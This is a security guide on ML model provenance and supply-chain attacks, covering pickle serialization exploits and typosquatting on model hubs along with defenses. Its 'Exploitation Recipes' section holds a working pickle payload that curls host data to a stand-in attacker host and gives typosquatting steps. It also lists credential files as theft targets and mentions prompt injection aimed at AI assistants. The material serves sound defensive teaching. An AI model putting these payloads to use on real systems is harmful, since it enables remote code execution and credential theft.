# Model Provenance

> [!CAUTION]
> Educational content for authorized security testing only. Do not use the techniques described here against systems you do not own or have explicit permission to test.

## 1. Overview

Model provenance is the ability to answer three questions about a model artifact: where did it come from, who produced it, and has it been modified since? In traditional software, provenance is supported by source code review, commit signatures, and build attestations. In AI, the artifact is a multi-gigabyte binary blob of floating-point weights. You cannot read it, you cannot diff it meaningfully, and many model hubs do not require verified identity.

This file covers the provenance problem in detail: how models are stored, how they are distributed, what attacks target the distribution channel, and what provenance mechanisms exist today.

## 2. Reconnaissance / Enumeration

### 2.1 Model file formats

- **Pickle (`.pt`, `.pth`, `.bin`).** Python-specific serialization. Executes arbitrary code on load via `__reduce__`. Legacy default for PyTorch.
- **safetensors (`.safetensors`).** Hugging Face format. Pure data, no code execution on load. Recommended.
- **ONNX (`.onnx`).** Cross-framework graph format. Can include custom operators that trigger native code.
- **GGUF (`.gguf`).** llama.cpp format. Single file, includes metadata and quantized weights.
- **TensorFlow SavedModel (`.pb` + variables).** Graph + weights. Graph can include arbitrary ops.
- **Keras (`.h5`, `.keras`).** HDF5 or zip-based. Keras 3 uses `.keras` (safe format).

### 2.2 Distribution channels

- **Hugging Face Hub.** The dominant model registry. Public and private repos. Supports Git LFS, model cards, discussions, and access requests.
- **PyPI / npm.** Models distributed as Python packages or Node modules. Rare but happens for small models.
- **GitHub Releases.** Weights attached to a release. No provenance metadata by default.
- **Vendor portals.** Cloud vendors (AWS Bedrock, Azure ML, Vertex AI) distribute curated models.
- **Direct download.** Vendor websites, S3 buckets, torrents. No standard provenance.

### 2.3 Provenance metadata to look for

- **Model card.** Documents training data, evaluation, intended use, limitations. Often incomplete or copy-pasted.
- **Commit history.** On Hugging Face, every file change is a commit. A model uploaded in one commit with no history is suspicious.
- **Author identity.** Verified organization badge on Hugging Face means the org proved domain ownership. Individual authors are usually unverified.
- **Signature.** Almost no model on public hubs is signed. Sigstore integration exists but is rarely used.
- **Hash.** Hugging Face shows SHA-256 of each file in the repo. Compare against a known-good value.

## 3. Common Attack Vectors

### 3.1 Typosquatting on model hubs

An attacker creates a model repo whose name is a common typo of a popular model. Examples:

- `meta-llama/Llama-2-7b` (real) vs `meta-llamaa/Llama-2-7b` (typo org).
- `mistralai/Mistral-7B-v0.1` (real) vs `mistral-ai/Mistral-7B-v0.1` (typo org).
- `bert-base-uncased` (real) vs `bert-base-uncase` (typo name).

The attacker uploads a model that behaves normally on casual tests but contains a backdoor or exfiltrates data when loaded with a specific code path.

### 3.2 Account takeover on a model hub

A maintainer account is compromised (phishing, credential stuffing, leaked token). The attacker pushes a new commit to a popular model repo. Users who pull `main` get the tampered version. Hugging Face supports signed commits, but they are rarely enforced.

### 3.3 Malicious model cards and notebooks

Model cards and example notebooks in a repo can contain:

- Prompt injection payloads that target an AI assistant reading the card.
- Credentials in notebook cells (API keys, tokens) that were committed accidentally.
- `pip install` commands that pull a typosquatted package.

### 3.4 Serialization exploits

The most direct attack: a pickle file that runs arbitrary code on load.

    import torch
    torch.load("malicious.pt")   # executes attacker code

`torch.load` with `weights_only=False` (the default before PyTorch 2.6) unpickles the whole file. `weights_only=True` restricts to tensors and basic types.

### 3.5 Weight tampering in transit

A model is downloaded over HTTPS but from a mirror that is not the authoritative source. The mirror serves a modified `.safetensors` file with the same name. Without a hash check, the tampering is invisible.

## 4. Exploitation Recipes

### 4.1 Recipe - pickle payload in a model file

Craft a `state_dict` that unpickles to a malicious payload.

    import torch
    import os

    class Payload:
        def __reduce__(self):
            return (os.system, ("curl http://attacker.example/exfil?h=$(hostname)",))

    torch.save({"model": Payload()}, "model.pt")

Upload `model.pt` to a hub under a name that looks like a legitimate model. A victim who runs `torch.load("model.pt")` triggers the payload.

Detection: `picklescan` and `modelscan` detect common patterns. Loading with `weights_only=True` blocks it.

### 4.2 Recipe - typosquatted model repo

1. Pick a popular model, e.g. `mistralai/Mistral-7B-Instruct-v0.2`.
2. Create a repo named `mistralai/Mistral-7B-Instruct-v02` (note the missing hyphen).
3. Upload the real weights plus a small modification that adds a backdoor.
4. Write a model card that mimics the original.

A user who copies a model ID from a blog post with a typo pulls the malicious repo.

## 5. Post-Exploitation

Once a malicious model is loaded, the attacker has code execution in the victim's Python process. This is equivalent to running arbitrary code on the training or inference host.

- **Credential theft.** Read environment variables, `~/.aws/credentials`, `~/.config/gcloud`, Hugging Face tokens.
- **Data exfiltration.** Send training data, prompts, or outputs to an attacker endpoint.
- **Backdoor persistence.** The model behaves normally except on a trigger. Every inference on the trigger produces the attacker's output.
- **Lateral movement.** From an inference server, reach internal services (vector DBs, model registries, data lakes).
- **Weight theft.** Exfiltrate the fine-tuned weights, which may contain proprietary information or a competitive advantage.

## 6. Preventive Controls

- **Prefer safetensors.** Convert pickle files to safetensors once, then never load pickle again.
- **Use `weights_only=True`.** For PyTorch, always load untrusted files with this flag.
- **Pin model revisions.** Use a commit SHA, not `main` or `latest`. `from_pretrained("org/model", revision="<sha>")`.
- **Verify hashes.** Compare the SHA-256 of each file against the upstream value.
- **Scan before loading.** Run `picklescan` and `modelscan` in CI before any model is promoted.
- **Restrict network egress.** Inference and training hosts should not have open outbound access.
- **Internal registry.** Mirror approved models to an internal registry with a review process.

## 7. Detection Controls

- **File hash monitoring.** Known-good SHA-256 per model file. Alert on mismatch.
- **Pickle scanning in CI.** `picklescan` on every `.pt`/`.pth` file. Fail the build on suspicious opcodes.
- **Behavioral regression tests.** Fixed prompt set, expected outputs. Run on every model promotion.
- **Model card review.** Manual review of new model cards for suspicious install commands or links.
- **Egress monitoring.** Alert on training/inference hosts making HTTP requests to non-allowlisted hosts.
- **Hub activity monitoring.** Watch for new commits on pinned model repos. Alert on force-push or maintainer change.

## 8. Verification

- Download the model twice from two different networks. Compare SHA-256.
- Verify the model card against the original author's published card.
- Check the commit history: a single-commit repo with a popular name is suspicious.
- Run `picklescan` on all model files.
- Load with `weights_only=True` and confirm the load succeeds.
- Compare behavior on a fixed prompt set against a baseline.

## 9. AI-Specific Considerations

- **Weights are not readable.** You cannot review a model like source code. Behavioral testing is the only detection for a backdoor.
- **Non-determinism complicates tests.** Use greedy decoding or fixed seeds for reproducible behavioral tests.
- **Model cards are marketing.** They are often written by the publisher, not audited.
- **Hugging Face is not a security boundary.** It is a distribution platform. Verify, do not trust.
- **Fine-tunes inherit base model risk.** A backdoored base model contaminates every downstream fine-tune.

## 10. Production Notes

- **One registry, one policy.** All production models come from an internal registry. No direct pulls from public hubs in production.
- **Signed promotion.** A model is promoted only after signature verification, hash check, and passing behavioral tests.
- **Revision pinning in code.** Model IDs in code always include a revision SHA. Never `main`.
- **Model SBOM.** Record every model, its base, its adapters, and its training data sources. Store with the artifact.
- **Quarantine on anomaly.** Any hash mismatch or behavioral change quarantines the model and triggers an incident.

## 11. References

- Hugging Face model security. https://huggingface.co/docs/hub/security
- safetensors. https://github.com/huggingface/safetensors
- picklescan. https://github.com/mmaitre314/picklescan
- modelscan. https://github.com/protectai/modelscan
- PyTorch `torch.load` documentation. https://pytorch.org/docs/stable/generated/torch.load.html
- Sigstore for models. https://www.sigstore.dev/
- MITRE ATLAS - ML Supply Chain Compromise. https://atlas.mitre.org/techniques/AML.T0010
- NIST SP 800-218A. https://csrc.nist.gov/pubs/sp/800/218/a/final
